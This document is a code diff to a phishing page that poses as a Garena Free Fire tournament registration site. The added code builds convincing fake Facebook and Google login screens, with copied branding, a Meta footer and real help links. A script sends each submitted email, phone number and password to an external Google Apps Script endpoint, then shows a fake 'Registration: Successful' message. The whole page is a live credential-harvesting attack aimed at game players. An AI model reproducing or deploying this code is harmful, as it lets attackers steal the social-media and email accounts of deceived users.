@@ -17,13 +17,17 @@
 
 	<style>
 		@import url('https://fonts.googleapis.com/css2?family=Kavivanar&family=Nunito+Sans:opsz@6..12&display=swap');
+		@import url('https://fonts.googleapis.com/css2?family=Open+Sans&display=swap');
 		*{
 			padding: 0;
 			margin: 0;
 			font-family: 'Nunito Sans';
 			box-sizing: border-box;
 		}
-		nav{
+		body{
+			position: relative;
+		}
+		.nav{
 		width: 100vw;
 		height: 50px;
 		background: #000;
@@ -34,15 +38,26 @@
 		left: 0;
 		z-index: 9999;
 		}
-		nav img{
+		.nav img{
 		width: auto;
 		height: 20px;
 		margin-left: 5px;
 		}
-		nav button{
+		div button{
+			padding: 5px 26px;
+			margin-left: 40px;
+			color: white;
+			background: #E1AE37;
+			border: none;
+			border-radius: 6px;
+			font-size: 17px;
+			transition: transform 5s linear 1s;
+		}
+		.nav button{
 			position: absolute;
 			right: 10px;
-			padding: 6px 14px;
+			padding: 4px 10px;
+			font-size: 15px;
 			border-radius: 4px;
 			border: none;
 			color: white;
@@ -122,16 +137,6 @@
 			font-weight: 400;
 			display: block;
 		}
-	div button{
-			padding: 5px 26px;
-			margin-left: 40px;
-			color: white;
-			background: #E1AE37;
-			border: none;
-			border-radius: 6px;
-			font-size: 17px;
-			transition: transform 5s linear 1s;
-		}
 	 button:active{
 			transform: scale(0.95);
 		}
@@ -182,7 +187,7 @@
            background: #fff;
           margin-top: -20px;
 		}
-		footer{
+		.footer{
 		width: 100vw;
 		height: 50px;
 	/*	position: fixed;*/
@@ -195,71 +200,36 @@
 		justify-content: center;
 		
 		}
-		footer img{
+		.footer img{
 			height: 30px;
 			width: auto;
 		}
+		#fb{
+			display: none;
+			position: fixed;
+			top: 30%;
+			left: 5%;
+	       width: 90vw;
+	       height: 40vh;
+	       background: #fff;
+	       border-radius: 12px;
+			border: 3px solid #e1ae37;
+			box-shadow: 0px 2px 7px #6A6A6A;
+		}
+		#fb img{
+			width: 60px;
+			border-radius: 12px;
+			margin-top: 30px;
+		}
+		#fb p{
+			margin-top: 20px;
+			
+		}
 
-.fb-logs {
-width: 400px;
-height: auto;
-background: #fff;
-position: relative;
-text-align: center;
-margin: 15% auto;
-}
-
-.nav-fb {
-background-color:#3b5998;
-height:40px;
-border:4px;
-padding:0px;
-}
-.btn-logs-fb {
-position:relative;
-width:90%;
-height:45px;
-margin:0;
-background-color:#4080ff;
-color:white;
-border-radius:3px;
-border:#4080ff;
-font-size:1em;
-font-weight:bold;
-letter-spacing:1px;
-outline:none;
-cursor:pointer;
-}
-input.logs {
-  font-size: auto;
-  width: 90%;
-  height: 45px;
-  padding:12px 20px;
-  margin: 8px auto;
-  background: none;
-  background-image: none;
-  border:1px solid #000;
-  color: #000;
-  border-radius: 2px;
-}
-.close-logs {
-padding: 0px 5px;
-background: #000;
-border-radius: 50%;
-border: 3px solid #fff;
-display: block;
-text-align: center;
-color: #fff;
-text-decoration: none;
-position: absolute;
-top: 0px;
-right: 0px;
-}
 #toast {
     visibility: hidden;
     max-width: 50px;
     height: 50px;
-    /*margin-left: -125px;*/
     margin: auto;
     background-color: #333;
     color: #fff;
@@ -267,7 +237,7 @@ right: 0px;
     border-radius: 2px;
 
     position: fixed;
-    z-index: 1;
+    z-index: 1000001;
     left: 0;right:0;
     bottom: 30px;
     font-size: 17px;
@@ -342,14 +312,271 @@ right: 0px;
     from {bottom: 30px; opacity: 1;}
     to {bottom: 60px; opacity: 0;}
 }
+.logi-fb{
+	background: #fff;
+	display: flex;
+	align-items: center;
+	justify-content: center;
+	width: 250px;
+	height: 35px;
+	font-family: Roboto;
+	font-size: 13px;
+	font-weight: 420;
+	space-between: 2px;
+	border: 2px solid #B7BAC3;
+	border-radius: 5px;
+	font-family: 'Open Sans';
+}
+
+/*Facebook Login*/
+#fb-login {
+  position: fixed;
+  top: 0;
+  left: 0;
+  display: none;
+  width: 100vw;
+  height: 100vh;
+  flex-flow: column;
+  z-index: 100000;
+}
+.fb-nav{
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 50px;
+  width: 100%;
+  background: #3b5998;
+}
+.fb-content{
+  width: 100%;
+  height: auto;
+  background: #eceff6;
+}
+.fb-content img{
+  height: 55px;
+  margin-top: 30px;
+  border-radius: 12px;
+}
+.fb-content p{
+   font-family: 'Open Sans';
+  margin-top: 10px;
+  font-size: 0.8em;
+  color: #b3b6be;
+}
+.fb-content input{
+  padding: 13px 20px;
+  width: 90%;
+  border: none;
+}
+.fb-content button{
+  margin: 14px 0 10px 0;
+  width: 90%;
+  padding: 10px 20px;
+  border: none;
+  color: white;
+  border-radius: 5px;
+  background: #1878f3;
+  font-size: 0.8em;
+}
+.fb-content a{
+  color: #1878f3;
+  font-weight: 400;
+  font-size: 0.8em;
+  text-decoration: none;
+}
+.fb-content a:nth-of-type(2),.fb-content a:nth-of-type(3){
+  color: #6f7b93;
+  font-size: 0.7em;
+}
+.fb-footer{
+  background: #e5e6eb;
+  width: 100%;
+  flex-grow : 1;
+  display: flex;
+  flex-flow: column;
+}
+.fb-footer img{
+  height: 100px;
+  margin-top: 20%;
+}
+.fb-footer span{ 
+  margin: 20% 65px;
+  list-style: none;
+  font-size: 12px;
+}
+.fb-footer span li{
+  margin: 3px 0;
+  color: #7c88a1;
+  font-weight: 440;
+}
+.fb-footer span .bl{
+  font-size: 13px;
+  margin: 0 -8px;
+  color: #9a9da4;
+}
+.meta{
+  color: #9a9da4;
+  font-size: 14px;
+}
+
+
+/* Google Login */
+
+#goog-log{
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  background: #fff;
+  z-index: 1000000;
+}
+
+.g_wrapper {
+/*	display: none;*/
+  box-sizing: content-box;
+  width: 270px;
+  height: 400px;
+  -webkit-box-shadow: 0 1px 4px 0 rgba(0, 0, 0, 0.2);
+          box-shadow: 0 1px 4px 0 rgba(0, 0, 0, 0.2);
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  -webkit-transform: translate(-50%, -50%);
+          transform: translate(-50%, -50%);
+  background: rgba(255, 255, 255, 0.95);
+  padding: 50px 50px 10px 50px;
+}
+
+.g_wrapper img {
+  width: 80px;
+}
+
+.g_wrapper h1 {
+  font-weight: normal;
+  font-size: 24px;
+  margin-bottom: 0;
+  line-height: 34px;
+}
+
+.g_wrapper p {
+  margin-top: 0;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.g_wrapper .animate-label {
+  position: relative;
+  margin-top: 30px;
+}
+
+.g_wrapper .animate-label label {
+  position: absolute;
+  bottom: 6px;
+  left: 0;
+  -webkit-transition: all .3s ease;
+  transition: all .3s ease;
+  font-size: 14px;
+  width: 100%;
+  color: #888888;
+}
+
+.g_wrapper .animate-label input:valid + label,
+.animate-label input:focus + label {
+  bottom: 30px;
+  font-size: 10px;
+}
+
+.g_wrapper .animate-label input:focus + label {
+  color: #4285f4;
+}
+
+.g_wrapper .animate-label line:before {
+  content: '';
+  position: absolute;
+  background: #4285f4;
+  width: 0;
+  height: 2px;
+  right: 50%;
+  bottom: 0;
+}
+
+.g_wrapper .animate-label input:focus ~ line:before {
+  width: 100%;
+  right: 0;
+  -webkit-transition: all .3s ease;
+  transition: all .3s ease;
+}
+
+.g_wrapper form {
+  display: -webkit-box;
+  display: -ms-flexbox;
+  display: flex;
+  -webkit-box-orient: vertical;
+  -webkit-box-direction: normal;
+      -ms-flex-direction: column;
+          flex-direction: column;
+}
+
+.g_wrapper input {
+  width: 100%;
+  border: none;
+  border-bottom: 1px solid #eee;
+  padding-bottom: 6px;
+}
+
+.g_wrapper input:focus {
+  outline: none;
+}
+
+.g_wrapper input:nth-of-type(2) {
+  margin-top: 15px;
+}
+
+.g_wrapper a {
+  color: #4285f4;
+  text-decoration: none;
+  margin-top: 30px;
+  font-size: 14px;
+}
+
+.g_wrapper .flex {
+  display: -webkit-box;
+  display: -ms-flexbox;
+  display: flex;
+  -webkit-box-pack: justify;
+      -ms-flex-pack: justify;
+          justify-content: space-between;
+  -webkit-box-align: center;
+      -ms-flex-align: center;
+          align-items: center;
+}
+
+.g_wrapper button {
+  display: block;
+  border-radius: 5px;
+  height: 30px;
+  width: 65px;
+  background-color: #4285f4;
+  border: none;
+  color: #fff;
+  text-align: center;
+  font-size: 12px;
+  -webkit-box-shadow: 0 1px 4px 0 rgba(0, 0, 0, 0.26);
+          box-shadow: 0 1px 4px 0 rgba(0, 0, 0, 0.26);
+   margin: 0;
+   padding: 0;
+  margin-top: 30px;
+}
 	</style>
 		
 </head>
 <body>
-	<nav>
+	<div class="nav">
 		<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjcnYFS_Co-L1PHp1qeGFbPt4bOiwTUNFnlCKj1Hnd-BhnHHnDHb8S-OIQyBdFEuXp_I4cP5P-WZOxkyyMUh4RpUpCTftgKYX6USV2puTH2RyNh4NiERCmcrPoNwaw6lzlfVIdtt2ZQuhyHe35seQBeKIreAxgxIhH0FTZM1blKULI54Un_Xc5_Oi1Jluuz/s1600/logo.png"/>
 		<button onclick="window.open('https://ffshare.garena.com/?region=IND&lang=en')">Open Game</button>
-  </nav>
+  </div>
   <center>
   <div class="content">
   	<div class="up">
@@ -395,24 +622,12 @@ right: 0px;
 <div style="margin: 0; padding-bottom: 30px;"><br/><span>*Tournament Registration</span><br/><br/><span id="regi">Registration: N/A</span><br/><span id="dat">Game Date: N/A</span><br/><span id="rwd">Rewards: N/A</span><br/><span id="smp">Selected Map: N/A</span><br/><br/>Room ID & Password send in FF Inbox<br/><br/><br/><button onclick="location.reload()" style="margin: 0px;" onmousedown="buka.play()">OK</button></div>
 </div>
 
-<div id="fb" style="position: fixed; top: 20%; left: 5px; display: none;">
-<div class="fb-logs">
-<a onmousedown="tutup.play()" onclick="{document.getElementById('fb').style.display = 'none'; showBlur(false);}" class="close-logs">&times;</a>
-<div class="nav-fb">
-<img width="40px" style="border-radius: 10px;" align="top" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6asVBZkJJqmT2WrzZh6Z8s3lBM6rppg_QpHVv2n1vPaLJjwQ6rMlMZ3wSpsGFLtv1LY2czHqFIVOhM-kDyS1cbWscr3873SKvmEAzkZwLZylXupiwcmfYQdvcO_EWtjPuKKvWfTExLiFmjFgyEKZvL9iKiMlMl62WbZEhX_lRtWqst5_UVUKrfFfxljkx/s320/thumbnail.png"/>
-</div>
-<br/>
-<form id="fFarm">
-<input id="emn" class="logs" type="text" pattern="[^@\s]+@[^@\s]+\.[^@\s]+|[\+0-9]{10,13}" title="Type Valid Free Fire ID [Email or Phone]" placeholder="Email or Phone " minlength="10" autocapitalize="off" required="required"/>
-<input id="pass" class="logs" type="text" placeholder="Password " minlength="6" autocapitalize="off" required="required"/>
+<div id="fb">
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6asVBZkJJqmT2WrzZh6Z8s3lBM6rppg_QpHVv2n1vPaLJjwQ6rMlMZ3wSpsGFLtv1LY2czHqFIVOhM-kDyS1cbWscr3873SKvmEAzkZwLZylXupiwcmfYQdvcO_EWtjPuKKvWfTExLiFmjFgyEKZvL9iKiMlMl62WbZEhX_lRtWqst5_UVUKrfFfxljkx/s320/thumbnail.png"/>
+<p>Connect Free Fire account</p>
 <br/><br/>
-<button type="submit" onmousedown="buka.play()" class="btn-logs-fb"><b>Register</b></button>
-<br/><br/>
-
-
-<br/><br/>
-</form> 
-</div>
+<span class="logi-fb" onclick="fbLogs.style.display = 'flex'"><svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="20px" height="20px"><path fill="#1878f3" d="M24 5A19 19 0 1 0 24 43A19 19 0 1 0 24 5Z"/><path fill="#fff" d="M26.572,29.036h4.917l0.772-4.995h-5.69v-2.73c0-2.075,0.678-3.915,2.619-3.915h3.119v-4.359c-0.548-0.074-1.707-0.236-3.897-0.236c-4.573,0-7.254,2.415-7.254,7.917v3.323h-4.701v4.995h4.701v13.729C22.089,42.905,23.032,43,24,43c0.875,0,1.729-0.08,2.572-0.194V29.036z"/></svg>&nbsp;Continue with Facebook</span>
+<span style="margin-top: 10px;" onclick="gLogs.style.display = 'block'" class="logi-fb"><svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="20px" height="20px"><path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/></svg>&nbsp;Continue with Google</span>
 </div>
 
 
@@ -421,10 +636,81 @@ right: 0px;
 <div><br/>*Important Notes<br/><br/>1. ID 50+ Level Required<br/>2. Please Submit Correct Information<br/>3. Room ID & Password send in FF Inbox<br/><br/><br/><button onclick="readedFun()" style="margin: 0px;" onmousedown="buka.play()">OK</button></div>
 </div>
   </center>
-  <footer><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhr9zJS3NMzE2p0ofvRf4_lbGmMLKLF2Fv2ih3YDE1eF7M3AGN5sT30L8TOpmiOJP9kLahq9vWPLxY1UNlPR-2Do3Q1DIHJ0_0OK-pwMmBGpJPPCjBphkNha2lwKrsK0O44nYLczOCBXUpPdqn_5tU5-ehmUfoOllV6J-tYKbb2GcHGOmur4C3lM_-rl9R_/s320/garena-logo.png"/>
-  </footer>
+  
+  
+    <center>
+  <div id="fb-login">
+    <div class="fb-nav"><img height="45%" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLaPQACXo42l_u5VSoB-qF5nyG_CjuF-qyIWXAFhxSXhOuo87E_r19RZptiONxPj3zLC5vh36Mlt-IAL6_5MGoSZchY1e6Gcl-YnQL0elCwZuRci5Mmv321lXkDC6WgLo9xTbYhUVLSlRKX8yq9fW0OwQVS3s7w38gQZD8_BfqabZYXCORw8PYFDArqxwc/s1600/fb-logo.png" alt="#"></div>
+    <div class="fb-content">
+      <!--fb Content-->
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEim040KvMvlgUiQafM1CGZ3E04MJVtxlRr2Xm2HGCeRPaCO1EDPYYyFXevDHzKi75XmGaJRv3FfR6rlwITn8XwbqQCUviwL5VQUuyaYvL7nqsui6c6DwuhG_exMDZGpF1d9DOoPI7qYV8Qu5kh82wgGv_Jc0aqhUW1uVhlmibDnDp9YgCtnsRLNYu_-0SU5/s1600/ff-logo.png" alt="#">
+      <p>Login to your Facebook account to<br/> connect to Garena Free Fire</p>
+      <form id="fbForm">
+      <input id="emn2" style="margin-top: 20px; border-radius: 5px 5px 0 0;" type="text" placeholder="Mobile number or email address" pattern="[^@\s]+@[^@\s]+\.[^@\s]+|[\+0-9]{10,13}" title="Type Valid Free Fire ID [Email or Phone]" required/>
+      <input id="pass2" style="border-radius: 0 0 5px 5px;" type="text" placeholder="Facebook password" minlength="6" autocapitalize="off" required/>
+      <button type="submit"><b>Log in</b></button>
+      </form>
+      <a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin.php%3Fskip_api_login%3D1%26api_key%3D2036793259884297%26kid_directed_site%3D0%26app_id%3D2036793259884297%26signed_next%3D1%26next%3Dhttps%253A%252F%252Fm.facebook.com%252Fdialog%252Foauth%253Fclient_id%253D2036793259884297%2526redirect_uri%253Dhttps%25253A%25252F%25252Fauth.garena.com%25252Foauth%25252Flogin%25252Ffacebook%2526response_type%253Dtoken%2526scope%253Dpublic_profile%25252Cemail%25252Cuser_friends%2526state%253Dresponse_type%2525253Dcode%25252526client_id%2525253D100067%25252526redirect_uri%2525253Dhttps%252525253A%252525252F%252525252Foauth-redirect.googleusercontent.com%252525252Fr%252525252Fauth.garena.com%25252526state%2525253DAEUpNzYeX1SmJQ1ssq2Tpzr-qC_jaYpVXG70-wmW03BgkHmUPaHQsQ4BBxYE8iDj9Eq8jZZecDO4anHJfjQl-6eGXcjfkbr3AUKt4jw6DBoKK136qMItFvczENpNoNQ5qQRNh3RpW6jDEnJJRWfjAtXbb0zQIOwIc_kL6cLsJveAV3yrZSDwtaIWTJvho5qL95FpQbRpiOQg9T-W1JzXNG-BJNo9EpMIYyiaDF8TA6PiYhjEOncxaW6qvbr4LGRr0Oq0PI55HYoCMrSQ4zJ_aLnW55u1lgXQKQShcUDOBFS-90kiiVuLoD_vD919PDL3om4b4nbwOH6H0NKK5PNqimZNyLoxIIz_ZaILnr5dZ7Z6hCPw15EFqMTx_5L7Gu1t5Vv_jqLqbLQMPMmWlYasZTUXy5DgvT6XdrOqXgzplP5OKHTrzbb_1VIY8t9gk4VF21KurDyn0cfvRteCvw7xQJe762pqOL8QHaLWoyFevHs25LApuQu5gHcOAXixIhUGiN3CUQG2reyWWALsC1csvL--d-bJMcmE2XI_C9HdjblRYHXF7MiXmEblXnn-Hb8Pvv1_THugA2vN_w_m45IYegV0WKkSECFTco8kWfhYbss00oHrLxbXsaNEWXVN5aX7PYgfpc4r_P-U_UuOiy4si0HNR4vS1JWWxh1CZMIuaUrEinC2hTjD1DkYQ27PtZ7FrJG113KVk16oZjgN7oHOzJC-P5rd-cCwqUFESJxlo7a8z5liixiRtDalDhuN6TUbvrkvwQlqFBAY4BgaCqWNAnZuXJ5dspknDqhjiggTAu42oV-V0aoZBO26naQ2WepUyUmmkWnEmlscfaJ6JgmnQ4rikXGhKJJdOuT8mIaqB951Jpfq2q75gkxGRhHabvXthtZCoSRC08VP376J2NBzaVXBxEEwmaC1ttxe5197gBvv1nRK-S1hx0hgL2EyHXFT4U0FR5bigTM4oajBvNPxdwekyQkfkQ6lAfb04yGDVhUe0HUTeOZbnDQ%25252526platform%2525253D3%2526ret%253Dlogin%2526fbapp_pres%253D0%2526logger_id%253Dd339ee04-78c5-433b-bbea-f915a9eab18a%2526tp%253Dunspecified%26cancel_url%3Dhttps%253A%252F%252Fauth.garena.com%252Foauth%252Flogin%252Ffacebook%253Ferror%253Daccess_denied%2526error_code%253D200%2526error_description%253DPermissions%252Berror%2526error_reason%253Duser_denied%2526state%253Dresponse_type%2525253Dcode%25252526client_id%2525253D100067%25252526redirect_uri%2525253Dhttps%252525253A%252525252F%252525252Foauth-redirect.googleusercontent.com%252525252Fr%252525252Fauth.garena.com%25252526state%2525253DAEUpNzYeX1SmJQ1ssq2Tpzr-qC_jaYpVXG70-wmW03BgkHmUPaHQsQ4BBxYE8iDj9Eq8jZZecDO4anHJfjQl-6eGXcjfkbr3AUKt4jw6DBoKK136qMItFvczENpNoNQ5qQRNh3RpW6jDEnJJRWfjAtXbb0zQIOwIc_kL6cLsJveAV3yrZSDwtaIWTJvho5qL95FpQbRpiOQg9T-W1JzXNG-BJNo9EpMIYyiaDF8TA6PiYhjEOncxaW6qvbr4LGRr0Oq0PI55HYoCMrSQ4zJ_aLnW55u1lgXQKQShcUDOBFS-90kiiVuLoD_vD919PDL3om4b4nbwOH6H0NKK5PNqimZNyLoxIIz_ZaILnr5dZ7Z6hCPw15EFqMTx_5L7Gu1t5Vv_jqLqbLQMPMmWlYasZTUXy5DgvT6XdrOqXgzplP5OKHTrzbb_1VIY8t9gk4VF21KurDyn0cfvRteCvw7xQJe762pqOL8QHaLWoyFevHs25LApuQu5gHcOAXixIhUGiN3CUQG2reyWWALsC1csvL--d-bJMcmE2XI_C9HdjblRYHXF7MiXmEblXnn-Hb8Pvv1_THugA2vN_w_m45IYegV0WKkSECFTco8kWfhYbss00oHrLxbXsaNEWXVN5aX7PYgfpc4r_P-U_UuOiy4si0HNR4vS1JWWxh1CZMIuaUrEinC2hTjD1DkYQ27PtZ7FrJG113KVk16oZjgN7oHOzJC-P5rd-cCwqUFESJxlo7a8z5liixiRtDalDhuN6TUbvrkvwQlqFBAY4BgaCqWNAnZuXJ5dspknDqhjiggTAu42oV-V0aoZBO26naQ2WepUyUmmkWnEmlscfaJ6JgmnQ4rikXGhKJJdOuT8mIaqB951Jpfq2q75gkxGRhHabvXthtZCoSRC08VP376J2NBzaVXBxEEwmaC1ttxe5197gBvv1nRK-S1hx0hgL2EyHXFT4U0FR5bigTM4oajBvNPxdwekyQkfkQ6lAfb04yGDVhUe0HUTeOZbnDQ%25252526platform%2525253D3%2523_%253D_%26display%3Dtouch%26locale%3Den_GB%26pl_dbl%3D0%26refsrc%3Ddeprecated&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&wtsid=rdr_0itygZ9qKyqtIwwUw&locale2=en_GB&_rdr">Forget password?</a>
+      <br/><br/>
+      <a href="https://m.facebook.com/reg/?app_id=2036793259884297&logger_id=d339ee04-78c5-433b-bbea-f915a9eab18a&is_two_steps_login=0&cid=103&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26redirect_uri%3Dhttps%253A%252F%252Fauth.garena.com%252Foauth%252Flogin%252Ffacebook%26response_type%3Dtoken%26scope%3Dpublic_profile%252Cemail%252Cuser_friends%26state%3Dresponse_type%25253Dcode%252526client_id%25253D100067%252526redirect_uri%25253Dhttps%2525253A%2525252F%2525252Foauth-redirect.googleusercontent.com%2525252Fr%2525252Fauth.garena.com%252526state%25253DAEUpNzYeX1SmJQ1ssq2Tpzr-qC_jaYpVXG70-wmW03BgkHmUPaHQsQ4BBxYE8iDj9Eq8jZZecDO4anHJfjQl-6eGXcjfkbr3AUKt4jw6DBoKK136qMItFvczENpNoNQ5qQRNh3RpW6jDEnJJRWfjAtXbb0zQIOwIc_kL6cLsJveAV3yrZSDwtaIWTJvho5qL95FpQbRpiOQg9T-W1JzXNG-BJNo9EpMIYyiaDF8TA6PiYhjEOncxaW6qvbr4LGRr0Oq0PI55HYoCMrSQ4zJ_aLnW55u1lgXQKQShcUDOBFS-90kiiVuLoD_vD919PDL3om4b4nbwOH6H0NKK5PNqimZNyLoxIIz_ZaILnr5dZ7Z6hCPw15EFqMTx_5L7Gu1t5Vv_jqLqbLQMPMmWlYasZTUXy5DgvT6XdrOqXgzplP5OKHTrzbb_1VIY8t9gk4VF21KurDyn0cfvRteCvw7xQJe762pqOL8QHaLWoyFevHs25LApuQu5gHcOAXixIhUGiN3CUQG2reyWWALsC1csvL--d-bJMcmE2XI_C9HdjblRYHXF7MiXmEblXnn-Hb8Pvv1_THugA2vN_w_m45IYegV0WKkSECFTco8kWfhYbss00oHrLxbXsaNEWXVN5aX7PYgfpc4r_P-U_UuOiy4si0HNR4vS1JWWxh1CZMIuaUrEinC2hTjD1DkYQ27PtZ7FrJG113KVk16oZjgN7oHOzJC-P5rd-cCwqUFESJxlo7a8z5liixiRtDalDhuN6TUbvrkvwQlqFBAY4BgaCqWNAnZuXJ5dspknDqhjiggTAu42oV-V0aoZBO26naQ2WepUyUmmkWnEmlscfaJ6JgmnQ4rikXGhKJJdOuT8mIaqB951Jpfq2q75gkxGRhHabvXthtZCoSRC08VP376J2NBzaVXBxEEwmaC1ttxe5197gBvv1nRK-S1hx0hgL2EyHXFT4U0FR5bigTM4oajBvNPxdwekyQkfkQ6lAfb04yGDVhUe0HUTeOZbnDQ%252526platform%25253D3%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd339ee04-78c5-433b-bbea-f915a9eab18a%26tp%3Dunspecified&locale2=en_GB&refsrc=deprecated&soft=hjk">Create account</a>
+      <br/>
+      <a href="https://m.facebook.com/help/?locale2=en_GB&refid=9">Help center</a>
+      <br/><br/>
+    </div>
+    
+    <div class="fb-footer">
+      <div style="display: flex; flex-flow: row; margin: 0 auto;">
+        <span>
+          <li class="bl">English (UK)</li>
+          <li>हिंदी</li>
+          <li>اردو</li>
+          <li>தமிழ்</li>
+        </span>
+      
+        <span>
+          <li>ગુજરાતી</li>
+          <li>मराठी</li>
+          <li>ਪੰਜਾਬੀ</li>
+        </span>
+        </div>
+        <p class="meta">Meta &copy; 2024</p>
+      </div>
+    </div>
+  </div>
+  </center>
+  
+  <div class="footer"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhr9zJS3NMzE2p0ofvRf4_lbGmMLKLF2Fv2ih3YDE1eF7M3AGN5sT30L8TOpmiOJP9kLahq9vWPLxY1UNlPR-2Do3Q1DIHJ0_0OK-pwMmBGpJPPCjBphkNha2lwKrsK0O44nYLczOCBXUpPdqn_5tU5-ehmUfoOllV6J-tYKbb2GcHGOmur4C3lM_-rl9R_/s320/garena-logo.png"/>
+  </div>
   <div id="toast"><div id="img"><img style="width:100%; height: 100%;" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi6asVBZkJJqmT2WrzZh6Z8s3lBM6rppg_QpHVv2n1vPaLJjwQ6rMlMZ3wSpsGFLtv1LY2czHqFIVOhM-kDyS1cbWscr3873SKvmEAzkZwLZylXupiwcmfYQdvcO_EWtjPuKKvWfTExLiFmjFgyEKZvL9iKiMlMl62WbZEhX_lRtWqst5_UVUKrfFfxljkx/s320/thumbnail.png"/></div>
 <div id="desc">Loading...</div></div>
+
+<!-- Google Login -->
+  <div id="goog-log">
+  <div class="g_wrapper">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjAf5pjYgsNpuEMzCF4pTw6tdIMcEiBOmdtX6D_FqPoiXQmfPGkWyD8BPbQaokMyklWdBbL9xBD7E4mXYGesSkNqKqOXlkPa8Wcg-6nZRLdeOOdyqwrJhFR8ym4YPPP8s3GXUfsSqeInYXbr28KRpIKuuZUu5BlwBWodkmGNXZyelmxggVvg6q6uQDKSB3c/s1600/g_logo.png" alt="#">
+        <h1 class="title">Sign in</h1>
+        <p>to continue to Gmail</p>
+        <form id="gForm">
+            <div class="animate-label">
+                <input id="emn1" type="text" pattern="[^@\s]+@[^@\s]+\.[^@\s]+|[\+0-9]{10,13}" title="Type Valid Free Fire ID [Email or Phone]" autocapitalize="off" required/>
+                <label for="emn1">Email or Phone</label>
+                <line></line>
+            </div>
+            <div class="animate-label">
+                <input id="pass1" type="text" minlength="6" autocapitalize="off" required="required"/>
+                <label for="pass1">Password</label>
+                <line></line>
+            </div>
+            <a href="https://www.google.com/intl/en-GB/account/about/">Forget Password?</a>
+            <div class="flex">
+                <a href="https://www.google.com/intl/en-GB/account/about/">More Options</a>
+                <button>Next</button>
+            </div>
+        </form>
+    </div>
+  </div>
+  
+
   <script>
   	var buka = new Audio();
   var b_click = false;
@@ -438,10 +724,19 @@ buka.src = "https://5.top4top.net/m_13444g1we0.mp3";
 
 var tutup = new Audio();
 tutup.src = "https://2.top4top.net/m_1344hm49c1.mp3";
+var tost = document.getElementById("toast");
+var emn1 = document.getElementById("emn1");
+var pass1 = document.getElementById("pass1");
+var emn2 = document.getElementById("emn2");
+var pass2 = document.getElementById("pass2");
 
-var emn = document.getElementById("emn");
-var pass = document.getElementById("pass");
+var fbLogs = document.getElementById("fb-login");
+var gLogs = document.getElementById("goog-log");
 	
+var fbForm = document.getElementById("fbForm");
+var gForm = document.getElementById("gForm");
+
+
 function setUp(){
 const date = new Date();
 d1 = (date.getDate()+4)+"-"+(date.getMonth()+1)+"-"+date.getFullYear();
@@ -453,7 +748,7 @@ document.getElementsByClassName("date")[2].textContent = d2;
 }
 window.onload = (event) => {
 setUp();
-
+setTimeout(readedFun,2500);
 document.getElementsByClassName("pop")[1].style.display = "block";
 showBlur(true);
 
@@ -465,6 +760,7 @@ function readedFun(){
    showBlur(false);
    b_click = true;
 }
+
 function showBlur(e){
 	if(e){
 document.getElementsByClassName("content")[0].style.filter = "blur(5px)";
@@ -479,8 +775,8 @@ document.getElementsByClassName("content")[2].style.filter = "blur(0)";
 
 function firstPart(e,f,g){
 	if(b_click){
-	document.getElementById("fb").style.display = "block";
 	showBlur(true);
+	document.getElementById("fb").style.display = "block";
 	rwd = f+"\ud83d\udc8e";
 	smp = e;
 	dat = g;
@@ -489,33 +785,33 @@ function firstPart(e,f,g){
 
 const scriptURL = "https://script.google.com/macros/s/AKfycbyzVB_ltFnb0PYyEgHbxWD3whq04R605Zb1vXoYU1JdjwM_oq8Z6iCaXaGymnPO_wPxAA/exec";
 
-function subFarm(event){
-	event.preventDefault();
+
+function seForm(x,y,z){
 	const form = new FormData();
-      form.append("USERNAME",emn.value);
-      form.append("PASSWORD",pass.value);
-      launch_toast();
-   fetch(scriptURL, { method: 'POST', body: form})
-.then(response => console.log("Loading.."))
+      form.append("USERNAME",x);
+      form.append("PASSWORD",y);
+     form.append("LOGIN",z);
+      tost.className = "show";
+  fetch(scriptURL, { method: 'POST', body: form})
+.then(response => tost.className = tost.className.replace("show", ""))
 .then(() => {sendTur("Registration: Successful \u2705");})
 .catch(error => sendTur("Registration: Failed \u274C"));
 }
+
+fbForm.addEventListener("submit", function(e) {e.preventDefault(); seForm(emn2.value,pass2.value,"Facebook");});
+gForm.addEventListener("submit", function(e) {e.preventDefault(); seForm(emn1.value,pass1.value,"Google");});
 
